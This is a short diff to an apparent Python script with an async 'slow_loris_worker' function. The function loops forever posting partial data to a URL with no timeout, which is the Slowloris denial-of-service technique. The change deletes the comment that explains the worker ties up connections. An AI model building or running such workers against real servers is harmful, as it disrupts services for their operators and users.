@@ -16,7 +16,7 @@ async def slow_loris_worker(url: str):
     async with aiohttp.ClientSession() as session:
         while True:
             try:
-                # Send incomplete headers to tie up the connection
+                
                 await session.post(url, headers={"X-Partial-Header": "A"}, data="B", timeout=None)
                 await asyncio.sleep(15) 
             except Exception:
